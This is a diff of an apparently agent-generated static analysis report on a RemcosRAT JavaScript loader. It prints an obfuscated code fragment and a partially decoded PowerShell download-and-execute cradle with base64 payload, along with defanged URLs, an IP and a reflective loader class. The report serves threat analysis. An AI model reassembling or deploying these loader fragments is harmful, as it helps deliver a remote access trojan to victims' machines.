@@ -1,8 +1,66 @@
-# Single-Sample Static Malware Analysis - `daf2410a4e6da576`
+# Storytime: Dissecting a RemcosRAT JS loader
+
+> **Source:** [MalwareBazaar](https://bazaar.abuse.ch/sample/daf2410a4e6da576f80df9cfd4b69eb8b2ee74c49948a501d6618063c7950437/) · **SHA-256** `daf2410a4e6da576f80df9cfd4b69eb8b2ee74c49948a501d6618063c7950437` · **Family** `RemcosRAT` · **Static analysis only — the sample was never run.**
+
+## The Story
+
+It showed up on MalwareBazaar as a 40906-byte `js` file, tagged `RemcosRAT`. We pulled exactly one copy into quarantine, cracked open the password-protected archive, and read the bytes as inert text. Nothing here was executed — every claim below comes from reading the code, not running it. Here is what it was hiding.
+
+## First Contact — The Code As It Arrived
+
+Straight out of the archive, a portion of the sample looks like this (defanged):
+
+```javascript
+var hbdakAhh = "powmdhanbfpdrkniFermdhan";
+hbdakAhh += "bfpdrkniFshemdhanbfpdrkn";
+hbdakAhh += "iFll mdhanbfpdrkniF\"$mdh";
+hbdakAhh += "anbfpdrkniFddsmdhanbfpdr";
+hbdakAhh += "kniFfdfmdhanbfpdrkniFdjm";
+hbdakAhh += "dhanbfpdrkniFhsdmdhanbfp";
+hbdakAhh += "drkniFfgdmdhanbfpdrkniFg";
+hbdakAhh += "omdhanbfpdrkniF = mdhanb";
+hbdakAhh += "fpdrkniF'DQmdhanbfpdrkni";
+hbdakAhh += "FAKAmdhanbfpdrkniFFMmdha";
+hbdakAhh += "nbfpdrkniFAdmdhanbfpdrkn";
+hbdakAhh += "iFABmdhanbfpdrkniFhAmdha";
+hbdakAhh += "nbfpdrkniFHImdhanbfpdrkn";
+hbdakAhh += "iFAdAmdhanbfpdrkniFAtAmd";
+hbdakAhh += "hanbfpdrkniFFMmdhanbfpdr";
+hbdakAhh += "kniFAbmdhanbfpdrkniFABmd";
+hbdakAhh += "hanbfpdrkniFlAmdhanbfpdr";
+hbdakAhh += "kniFGUmdhanbfpdrkniFAcmd";
+hbdakAhh += "hanbfpdrkniFAAgmdhanbfpd";
+hbdakAhh += "rkniFACmdhanbfpdrkniF0Am";
+hbdakAhh += "dhanbfpdrkniFUwmdhanbfpd";
+hbdakAhh += "rkniFBlmdhanbfpdrkniFAGM";
+... (truncated)
+```
+
+## Peeling Back the Obfuscation
+
+That wall of noise is deliberate. The sample assembles its real payload one fragment at a time and laces every fragment with a junk token, so a casual look (or a naive string scan) sees gibberish. Undo that concatenation and strip the junk token — purely as text, nothing runs — and the mask drops:
+
+```text
+powershell "$ddsfdfdjhsdfgdgo = 'DQAKAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADMADQAKAFsATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAIAA9ACAAWwBOAGUAdAAuAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAVAB5AHAAZQBdADoAOgBUAGwAcwAxADIADQAKACQAYgA2ADQAPQAnAGQAWABOAHAAYgBtAGMAZwBVADMAbAB6AGQARwBWAHQATwB5AEIAMQBjADIAbAB1AFoAeQBCAFQAZQBYAE4AMABaAFcAMAB1AFUAbQBWAG0AYgBHAFYAagBkAEcAbAB2AGIAagBzAGcAYwBIAFYAaQBiAEcAbABqAEkARwBOAHMAWQBYAE4AegBJAEYAQgBvAFkAVwA1ADAAYgAyADEASABZAFgAUgBsAGUAMwBCADEAWQBtAHgAcABZAHkAQgB6AGQARwBGADAAYQBXAE0AZwBRAFgATgB6AFoAVwAxAGkAYgBIAGsAZwBUAEcAOQBoAFoARQBGAHoAYwAyAFYAdABZAG0AeAA1AEsARwBKADUAZAB
+// ... truncated ...
+```
+
+Now the intent is legible. It hands a command to the system instead of doing the work in plain sight.
+
+## Following the Chain
+
+Each wrapper peels back to another (decoded as bytes, never executed):
+
+- **Layer 1** (utf-16le) — reaching out to hxxp://kickstrean[.]art/1[.]jpg, hxxps://66[.]63[.]170[.]33/img/1[.]jpg, 66[.]63[.]170[.]33, kickstrean[.]art. Preview: `Start-Sleep -Seconds 3 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 $b64...`
+- **Layer 2** (utf-8) — carrying more stage logic. Preview: `using System; using System.Reflection; public class PhantomGate{public static Assembly LoadAssembly(byte[] ...`
+
+## What It Wants To Do
+
+The behaviour that matters, recovered from the (deobfuscated) code: `obfuscation`, `powershell_cradle`, `shell_execution`. It leans on a PowerShell download/exec cradle to fetch and run its next stage in memory. It shells out to the OS to run external commands.
 
 ## Executive Summary
 
-The agent selected one MalwareBazaar submission and performed static analysis on that single artifact. The sample was not executed, loaded, imported, or dynamically tested. Static evidence produced 3 IOCs and 9 code/string findings, recovered 4 network indicator(s) by decoding the sample's own obfuscated/base64 payload layers, plus 2 metadata-derived network indicator(s) listed separately below.
+One MalwareBazaar submission, analyzed statically — never executed, loaded, imported, or dynamically tested. Static evidence produced 3 IOCs and 9 code/string findings, recovered 4 network indicator(s) by decoding the sample's own obfuscated/base64 payload layers, plus 2 metadata-derived network indicator(s) listed separately below.
 
 ## What The Agent Did
 
@@ -149,6 +207,15 @@ These strings were selected because they contain network indicators or suspiciou
 | String |
 |---|
 | none |
+
+## What We've Learned So Far
+
+How this sample sits against everything the loop has analyzed before:
+
+- Corpus before this sample: **0** prior sample(s).
+- First time the loop has seen the `RemcosRAT` family.
+- No overlap with earlier samples yet — this one expands the knowledge base.
+
 
 ## YARA Rules
 
